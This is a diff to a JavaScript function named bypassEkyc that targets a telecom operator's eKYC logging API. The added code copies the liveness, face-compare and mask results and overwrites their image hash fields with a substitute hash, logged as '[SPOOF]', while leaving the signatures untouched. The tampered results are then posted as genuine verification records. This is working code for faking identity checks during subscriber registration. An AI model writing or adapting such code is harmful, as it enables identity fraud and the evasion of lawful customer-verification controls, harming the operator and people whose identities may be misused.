@@ -779,15 +779,35 @@ window.bypassEkyc = async function(phone, btnElement, fastMode = false) {
 
         // 9. Log eKYC ket qua AI len ONEBSS
         btnElement.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Buoc 9/13: Ghi log eKYC...';
+        
+        let fakeMaskData = JSON.parse(JSON.stringify(maskData));
+        let fakeLivenessData = JSON.parse(JSON.stringify(livenessData));
+        let fakeCompareData = JSON.parse(JSON.stringify(compareData));
+
+        if (fastMode && realImageHash && idgVerifyHash !== p_image_hash) {
+            console.log('[SPOOF] Đánh tráo thuộc tính imgs ngoài cùng, GIỮ NGUYÊN Base64 và Chữ ký RSA...');
+            const spoofOuterHash = (dataObj) => {
+                if (dataObj && dataObj.imgs) {
+                    if (dataObj.imgs.img) dataObj.imgs.img = p_image_hash;
+                    if (dataObj.imgs.img_face) dataObj.imgs.img_face = p_image_hash;
+                    if (dataObj.imgs.img_front) dataObj.imgs.img_front = p_image_hash;
+                }
+                return dataObj;
+            };
+            fakeMaskData = spoofOuterHash(fakeMaskData);
+            fakeLivenessData = spoofOuterHash(fakeLivenessData);
+            fakeCompareData = spoofOuterHash(fakeCompareData);
+        }
+
         const logEkycPayload = {
             p_so_tb: phone,
             p_image_hash: p_image_hash, // Gửi Customer Hash
             p_challenge_code: challengeCode,
             p_client_session: clientSession,
             menu_id: 810241,
-            p_liveness: JSON.stringify(typeof livenessData !== 'undefined' ? livenessData : {}),
-            p_compare: JSON.stringify(typeof compareData !== 'undefined' ? compareData : {}),
-            p_mask: JSON.stringify(typeof maskData !== 'undefined' ? maskData : {})
+            p_liveness: JSON.stringify(fakeLivenessData || {}),
+            p_compare: JSON.stringify(fakeCompareData || {}),
+            p_mask: JSON.stringify(fakeMaskData || {})
         };
 
         await fetch('https://api-onebss.vnpt.vn/app-banhang/Ekyc/log_ekyc', {
